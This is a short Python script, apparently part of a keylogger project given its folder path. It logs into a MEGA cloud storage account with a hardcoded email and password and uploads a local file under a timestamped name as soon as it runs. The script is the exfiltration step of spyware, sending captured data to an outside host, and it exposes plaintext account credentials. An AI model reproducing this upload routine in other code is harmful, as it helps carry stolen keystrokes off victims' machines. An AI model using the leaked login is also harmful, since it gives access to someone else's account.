import os
import uuid
import datetime as dt
from mega import Mega


def upload():
    unique = str(uuid.uuid4())
    mega = Mega()

    m = mega.login("kushaluplay@gmail.com", "Kushal@0825")

    m.upload(
        filename="C:/Users/gubba/Desktop/CAPst/KEYLOGGER/examples.py",
        dest_filename=f"examples_{dt.datetime.now()}.py",
    )
    print("upload")


upload()
